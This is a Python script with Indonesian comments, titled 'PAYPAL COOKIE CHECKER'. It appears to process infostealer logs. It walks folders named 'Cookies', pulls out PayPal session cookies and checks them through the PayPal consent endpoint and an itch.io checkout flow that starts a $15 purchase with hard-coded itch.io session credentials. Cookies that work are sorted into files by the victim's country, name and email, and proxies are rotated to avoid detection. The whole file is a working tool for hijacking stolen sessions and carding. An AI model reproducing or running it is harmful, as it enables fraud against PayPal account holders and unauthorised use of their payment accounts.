import os
import re
import json
import time
import random
import string
import requests
import shutil
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ==================== KONFIGURASI ====================
USER_AGENTS = {
    'desktop': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36",
    'mobile': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/127.0.6533.107 Mobile/15E148 Safari/604.1"
}

# itch.io credentials
ITCHIO_COOKIE = "itchio_token=WyJhVHo2IiwxNzk1MDIwOTA1LCJpZmk5ZzdqTkZiS3lhNWYiXQ%3D%3D.9dXpB7Y8rBI72OZU2Ph0j9N%2FuKE%3D; _ga=GA1.1.1982632480.1795020911; _ga_36R7NPBMLS=GS2.1.s1795020911$o1$g1$t1795021268$j60$l0$h0"
ITCHIO_CSRF_TOKEN = "WyJhVHo2IiwxNzk1MDIwOTA1LCJpZmk5ZzdqTkZiS3lhNWYiXQ==.9dXpB7Y8rBI72OZU2Ph0j9N/uKE="
ITCHIO_GAME_SLUG = "indiepocalypse-77"

# Directories - USER PILIH SENDIRI
print("\n" + "="*60)
print("  PAYPAL COOKIE CHECKER - AUTO MOVE + RETRY SYSTEM")
print("="*60)

SOURCE_DIR = input("\n📍 Masukkan path folder sumber (tempat cookies .txt): ").strip()
SOURCE_DIR = Path(SOURCE_DIR)

if not SOURCE_DIR.exists():
    print(f"\n❌ Folder tidak ditemukan: {SOURCE_DIR}")
    exit()

DEST_DIR = input("📍 Masukkan path folder tujuan (untuk cookies INVALID): ").strip()
DEST_DIR = Path(DEST_DIR)
DEST_DIR.mkdir(parents=True, exist_ok=True)

# Base directory untuk save valid cookies (kayak awal)
BASE_DIR = Path("Cookies/Paypal_Valid")
BASE_DIR.mkdir(parents=True, exist_ok=True)

# Thread-safe lock
print_lock = Lock()
file_lock = Lock()

# Stats
stats = {'valid': 0, 'invalid': 0, 'total': 0, 'moved': 0, 'retry_success': 0}
stats_lock = Lock()

def load_proxies(proxy_file: str = "proxies.txt") -> list:
    if not os.path.exists(proxy_file):
        return []
    with open(proxy_file, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def random_string(pattern: str = "?d?m?d?m?d?m?d?m") -> str:
    result = ""
    i = 0
    while i < len(pattern):
        if pattern[i:i+2] == "?d":
            result += str(random.randint(0, 9))
            i += 2
        elif pattern[i:i+2] == "?m":
            result += random.choice(string.ascii_lowercase)
            i += 2
        elif pattern[i:i+2] == "?u":
            result += random.choice(string.ascii_uppercase)
            i += 2
        else:
            result += pattern[i]
            i += 1
    return result

def extract_paypal_cookies_only(content: str) -> list:
    """
    Extract ONLY PayPal cookies from any format
    Filter: domain must contain paypal.com or .paypal.com
    Format output: Netscape format
    """
    paypal_cookies = []
    
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        # Check if line contains PayPal domain
        if '\t' in line:
            # Netscape format
            parts = line.split('\t')
            if len(parts) >= 7:
                domain = parts[0].lower()
                # Only take PayPal cookies
                if 'paypal.com' in domain or '.paypal' in domain:
                    paypal_cookies.append({
                        'domain': parts[0],
                        'flag': parts[1],
                        'path': parts[2],
                        'secure': parts[3],
                        'expires': parts[4],
                        'name': parts[5],
                        'value': parts[6]
                    })
        else:
            # JSON or other format - look for paypal
            if 'paypal' in line.lower():
                # Try to extract key=value pairs
                pairs = re.findall(r'([a-zA-Z0-9_]+)=([^;]+)', line)
                for name, value in pairs:
                    if 'paypal' in name.lower() or 'paypal' in value.lower():
                        paypal_cookies.append({
                            'domain': '.paypal.com',
                            'flag': 'TRUE',
                            'path': '/',
                            'secure': 'FALSE',
                            'expires': '0',
                            'name': name.strip(),
                            'value': value.strip()
                        })
    
    # Remove duplicates based on name
    seen = set()
    unique_cookies = []
    for cookie in paypal_cookies:
        if cookie['name'] not in seen:
            seen.add(cookie['name'])
            unique_cookies.append(cookie)
    
    return unique_cookies

def cookies_to_netscape_string(cookies_list: list) -> str:
    """Convert cookies list to Netscape format string"""
    lines = []
    for cookie in cookies_list:
        line = f"{cookie['domain']}\t{cookie['flag']}\t{cookie['path']}\t{cookie['secure']}\t{cookie['expires']}\t{cookie['name']}\t{cookie['value']}"
        lines.append(line)
    return '\n'.join(lines)

def save_valid(cookie_netscape: str, email: str, country: str, name: str):
    """Save valid cookie - SAMA PERSIS KAYAK AWAL"""
    country_code = country.upper() if country else 'UNKNOWN'
    safe_email = re.sub(r'[<>:"/\\|?*]', '_', str(email)) if email else 'unknown'
    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', str(name))[:15] if name else 'unknown'
    
    country_dir = BASE_DIR / country_code
    country_dir.mkdir(parents=True, exist_ok=True)
    
    with file_lock:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = country_dir / f"[{country_code}] [{safe_name}] [{safe_email}] [{timestamp}].txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("# Netscape HTTP Cookie File\n")
            f.write(cookie_netscape)
        
        # Master file
        master_file = BASE_DIR / "ALL_VALID.txt"
        with open(master_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(f"Email: {email}\nCountry: {country}\nName: {name}\n")
            f.write(cookie_netscape)
            f.write("\n")

def check_cookie(cookies_list: list, proxy: str = None, timeout: int = 15) -> dict:
    """Fast cookie check with timeout"""
    result = {'valid': False, 'email': None, 'country': None, 'name': None}
    
    if not cookies_list:
        return result
    
    session = requests.Session()
    session.headers.update({'User-Agent': USER_AGENTS['desktop'], 'Accept': '*/*'})
    
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
        session.verify = False
    
    for cookie in cookies_list:
        session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
    
    try:
        # Step 1: IDAPPS
        resp = session.get("https://www.paypal.com/idapps/connect/consent?", timeout=timeout)
        
        if 'rmucEmail' not in resp.text:
            return result
        
        email_match = re.search(r'rmucEmail":"([^"]+)"', resp.text)
        if email_match:
            result['email'] = email_match.group(1)
        
        country_match = re.search(r'"country":"([^"]+)"', resp.text)
        if country_match:
            result['country'] = country_match.group(1)
        
        # Step 2: Itch.io purchase
        gen_email = random_string("?d?m?d?m?d?m?d?m") + "@gmail.com"
        
        itch_session = requests.Session()
        if proxy:
            itch_session.proxies = {'http': proxy, 'https': proxy}
            itch_session.verify = False
        
        for cookie_part in ITCHIO_COOKIE.split('; '):
            if '=' in cookie_part:
                name, value = cookie_part.split('=', 1)
                itch_session.cookies.set(name, value, domain='.itch.io')
        
        purchase_data = {
            'csrf_token': ITCHIO_CSRF_TOKEN,
            'source': 'paypal',
            'medium': 'default',
            'initiator': 'popup',
            'bp': 'c59bef2837208eb727024b36324fa84b',
            'price': '$15.00',
            'email': gen_email,
            'json': 'true'
        }
        
        purchase_url = f'https://pizzapranks.itch.io/{ITCHIO_GAME_SLUG}/purchase'
        itch_resp = itch_session.post(purchase_url, data=purchase_data, timeout=timeout)
        
        if itch_resp.status_code != 200:
            return result
        
        paypal_url = None
        try:
            data = itch_resp.json()
            paypal_url = data.get('url')
        except:
            paypal_match = re.search(r'https://www\.paypal\.com/[^"\'\s]+', itch_resp.text)
            if paypal_match:
                paypal_url = paypal_match.group(0)
        
        if not paypal_url:
            return result
        
        # Step 3: PayPal checkout
        mobile_session = requests.Session()
        if proxy:
            mobile_session.proxies = {'http': proxy, 'https': proxy}
            mobile_session.verify = False
        
        for cookie in cookies_list:
            mobile_session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
        
        mobile_session.headers.update({
            'User-Agent': USER_AGENTS['mobile'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        
        checkout = mobile_session.get(paypal_url, timeout=timeout, allow_redirects=True)
        content = checkout.text
        
        success_indicators = ['state":"LOGGEDIN"', 'user":{', 'welcome-name="', 'Welcome back!', 'welcomeMessage hide">']
        
        if any(ind in content for ind in success_indicators):
            result['valid'] = True
            
            name_match = re.search(r'welcome-name="([^"]+)"', content)
            if not name_match:
                name_match = re.search(r'welcomeMessage hide">([^<]+)', content)
            if name_match:
                result['name'] = name_match.group(1).strip()
        
    except:
        pass
    
    return result

def check_cookie_with_retry(cookies_list: list, proxies: list, timeout: int = 15, max_retries: int = 3, retry_delay: int = 2) -> dict:
    """
    Check cookie dengan sistem retry menggunakan proxy yang berbeda
    """
    result = None
    
    for attempt in range(max_retries):
        # Pilih proxy berbeda setiap attempt
        proxy = None
        if proxies and len(proxies) > 0:
            proxy = proxies[attempt % len(proxies)]
        
        if attempt > 0:
            time.sleep(retry_delay)  # Delay sebelum retry
        
        result = check_cookie(cookies_list, proxy, timeout)
        
        if result['valid']:
            if attempt > 0:
                with stats_lock:
                    stats['retry_success'] += 1
            return result
        
        # Jika dapet email tapi valid False, bisa jadi valid cuma gagal di step tertentu
        if result.get('email') and not result['valid']:
            # Coba lagi dengan proxy lain
            continue
    
    return result if result else {'valid': False, 'email': None, 'country': None, 'name': None}

def find_all_cookie_files(root_path: str) -> list:
    """
    Find ALL folders named 'Cookies' or 'cookies'
    Then scan all .txt files inside them
    """
    cookie_files = []
    root = Path(root_path)
    
    if not root.exists():
        return cookie_files
    
    print("   🔍 Searching for 'Cookies' folders...")
    
    # Find all folders named Cookies/cookies
    for folder in root.rglob('*'):
        if folder.is_dir() and folder.name.lower() == 'cookies':
            print(f"   📁 Found: {folder}")
            # Get all .txt files in this folder
            for txt_file in folder.glob('*.txt'):
                cookie_files.append(txt_file)
            # Also check for files without extension
            for file in folder.glob('*'):
                if file.is_file() and file.suffix == '' and file.name != 'Cookies':
                    cookie_files.append(file)
    
    # Also scan root folder for any .txt files that might contain cookies
    for txt_file in root.rglob('*.txt'):
        if txt_file.parent.name.lower() != 'cookies':
            # Quick check if contains paypal
            try:
                with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                    preview = f.read(2048)
                    if 'paypal' in preview.lower() or '.paypal' in preview.lower():
                        cookie_files.append(txt_file)
            except:
                pass
    
    # Remove duplicates
    cookie_files = list(set(cookie_files))
    
    return cookie_files

def pindahin_file_invalid(filepath: Path):
    """PINDAHIN file INVALID ke folder tujuan - NAMA FILE TETAP SAMA"""
    with file_lock:
        destination = DEST_DIR / filepath.name
        shutil.move(str(filepath), str(destination))

def hapus_file_valid(filepath: Path):
    """HAPUS file VALID dari folder sumber (karena udah ke save di Cookies/Paypal_Valid)"""
    with file_lock:
        filepath.unlink()  # Hapus file

def process_single_file(filepath, proxies, timeout=15, max_retries=3, retry_delay=2):
    """Process single file - with retry system"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Extract ONLY PayPal cookies
        cookies = extract_paypal_cookies_only(content)
        
        if not cookies:
            with stats_lock:
                stats['invalid'] += 1
            # PINDAHIN file invalid ke folder tujuan
            pindahin_file_invalid(filepath)
            with stats_lock:
                stats['moved'] += 1
            return {
                'file': filepath.name,
                'status': 'NO_PAYPAL',
                'email': 'N/A',
                'country': 'N/A',
                'name': 'N/A'
            }
        
        # Convert to netscape for checking
        cookie_netscape = cookies_to_netscape_string(cookies)
        
        # CHECK DENGAN RETRY SYSTEM
        result = check_cookie_with_retry(cookies, proxies, timeout, max_retries, retry_delay)
        
        if result['valid']:
            with stats_lock:
                stats['valid'] += 1
            
            # SAVE VALID - SAMA PERSIS KAYAK AWAL
            save_valid(cookie_netscape, result.get('email'), result.get('country'), result.get('name'))
            
            # HAPUS file valid dari folder sumber
            hapus_file_valid(filepath)
            
            retry_info = f" [RETRY SUCCESS]" if result.get('retry', False) else ""
            
            return {
                'file': filepath.name,
                'status': '✅ VALID',
                'email': result.get('email', 'N/A'),
                'country': result.get('country', 'N/A'),
                'name': result.get('name', 'N/A'),
                'cookies': len(cookies),
                'retry': result.get('retry', False)
            }
        else:
            with stats_lock:
                stats['invalid'] += 1
            # PINDAHIN file invalid ke folder tujuan
            pindahin_file_invalid(filepath)
            with stats_lock:
                stats['moved'] += 1
            return {
                'file': filepath.name,
                'status': '❌ INVALID',
                'email': result.get('email') if result.get('email') else 'N/A',
                'country': 'N/A',
                'name': 'N/A',
                'cookies': len(cookies)
            }
    except Exception as e:
        with stats_lock:
            stats['invalid'] += 1
        # Tetap pindahin file walaupun error
        try:
            pindahin_file_invalid(filepath)
            with stats_lock:
                stats['moved'] += 1
        except:
            pass
        return {
            'file': filepath.name,
            'status': f'⚠️ ERROR',
            'email': str(e)[:30],
            'country': 'N/A',
            'name': 'N/A'
        }

def main():
    print("\n" + "="*70)
    print("  💳 PAYPAL COOKIE CHECKER v2 - AUTO MOVE + RETRY SYSTEM")
    print("  🔥 Hanya mengambil cookies dengan domain paypal.com")
    print("  📁 Scan semua folder bernama 'Cookies' / 'cookies'")
    print("  🔄 Retry system: akan coba ulang dengan proxy berbeda jika gagal")
    print("  ✅ VALID cookies: DISIMPAN ke Cookies/Paypal_Valid & file asli DIHAPUS")
    print("  ❌ INVALID cookies: PINDAH ke folder tujuan (nama file tetap)")
    print("="*70 + "\n")
    
    print(f"📂 SUMBER: {SOURCE_DIR.absolute()}")
    print(f"📂 TUJUAN INVALID: {DEST_DIR.absolute()}")
    print(f"💾 SAVE VALID: {BASE_DIR.absolute()}")
    print("\n⚠️ PERINGATAN:")
    print("   • VALID cookies → file asli akan DIHAPUS dari folder sumber")
    print("   • INVALID cookies → file asli akan PINDAH ke folder tujuan\n")
    
    proxies = load_proxies()
    if proxies:
        print(f"📡 Proxies loaded: {len(proxies)}")
    else:
        print("⚠️ No proxies loaded (using direct connection)")
    
    # Thread setting
    print("\n⚙️  Thread Settings:")
    print("   1 = Slow (1 thread) - Safe")
    print("   3 = Normal (3 threads) - Recommended")
    print("   5 = Fast (5 threads)")
    print("   10 = Very Fast (10 threads)")
    
    thread_input = input("\n🔧 Number of threads (default 3): ").strip()
    max_workers = int(thread_input) if thread_input.isdigit() else 3
    
    timeout_input = input("⏱️  Timeout per request (seconds, default 15): ").strip()
    timeout = int(timeout_input) if timeout_input.isdigit() else 15
    
    # RETRY SETTINGS
    print("\n🔄 Retry Settings (untuk menghindari false invalid karena proxy lemot):")
    retry_input = input("   Jumlah retry (default 3): ").strip()
    max_retries = int(retry_input) if retry_input.isdigit() else 3
    
    delay_input = input("   Delay antar retry (detik, default 2): ").strip()
    retry_delay = int(delay_input) if delay_input.isdigit() else 2
    
    print(f"\n🚀 Starting with {max_workers} thread(s), timeout {timeout}s, max retries {max_retries}, delay {retry_delay}s\n")
    
    # Find all cookie files
    print("🔍 Scanning for cookie files...")
    files = find_all_cookie_files(str(SOURCE_DIR))
    
    # Filter out files that are already in DEST_DIR
    files = [f for f in files if DEST_DIR not in f.parents and f.parent != DEST_DIR]
    
    stats['total'] = len(files)
    
    print(f"\n📂 Found {stats['total']} potential cookie file(s)\n")
    
    if not files:
        print("❌ No cookie files found.")
        print("   Pastikan folder berisi file .txt dengan cookies")
        return
    
    confirm = input("🤔 Lanjutkan? (y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ Dibatalkan.")
        return
    
    print("\n" + "="*70)
    print("PROCESSING...")
    print("="*70 + "\n")
    
    start_time = time.time()
    results = []
    
    # Multi-thread processing
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_file = {}
        for i, filepath in enumerate(files):
            future = executor.submit(process_single_file, filepath, proxies, timeout, max_retries, retry_delay)
            future_to_file[future] = filepath
        
        completed = 0
        for future in as_completed(future_to_file):
            result = future.result()
            if result:
                results.append(result)
            
            completed += 1
            with print_lock:
                if result and result['status'] == '✅ VALID':
                    retry_mark = " 🔄" if result.get('retry') else ""
                    print(f"[{completed}/{stats['total']}] {result['status']}{retry_mark} | {result['file'][:35]:<35} | {result['email']:<25} | {result['country']} | {result['name']} | ({result.get('cookies',0)} cookies)")
                elif result:
                    print(f"[{completed}/{stats['total']}] {result['status']:<10} | {result['file'][:50]:<50}")
                else:
                    print(f"[{completed}/{stats['total']}] ⚠️ Unknown | Processing error")
    
    elapsed = time.time() - start_time
    
    # Summary
    print("\n" + "="*70)
    print("  📊 RESULTS SUMMARY")
    print("="*70)
    print(f"  ✅ VALID COOKIES      : {stats['valid']} (file asli DIHAPUS)")
    print(f"  🔄 RETRY SUCCESS      : {stats['retry_success']} (berhasil di percobaan ke-2/3)")
    print(f"  ❌ INVALID/EMPTY      : {stats['invalid']} (file PINDAH ke folder tujuan)")
    print(f"  📦 TOTAL FILES        : {stats['total']}")
    print(f"  📂 FILES MOVED        : {stats['moved']} (hanya INVALID)")
    if stats['total'] > 0:
        print(f"  📈 SUCCESS RATE       : {stats['valid']/stats['total']*100:.1f}%")
    print(f"  ⏱️  TIME ELAPSED       : {elapsed:.1f} seconds")
    print(f"  🧵 THREADS USED       : {max_workers}")
    print(f"  🔄 MAX RETRIES        : {max_retries}")
    print("="*70)
    
    print(f"\n📁 INVALID cookies pindah ke: {DEST_DIR.absolute()}")
    print(f"   → Nama file TETAP SAMA seperti aslinya")
    
    print(f"\n💾 VALID cookies disimpan di: {BASE_DIR.absolute()}")
    print("   Format: [Country] [Name] [Email] [Timestamp].txt")
    print("   → File asli di folder sumber sudah DIHAPUS")
    
    # Show valid cookies list
    if stats['valid'] > 0:
        print("\n📋 LIST OF VALID COOKIES:")
        print("-"*70)
        for r in results:
            if r['status'] == '✅ VALID':
                retry_mark = " (retry success)" if r.get('retry') else ""
                print(f"  📧 {r['email']:<30} | 🌍 {r['country']:<5} | 👤 {r['name']}{retry_mark}")

if __name__ == "__main__":
    main()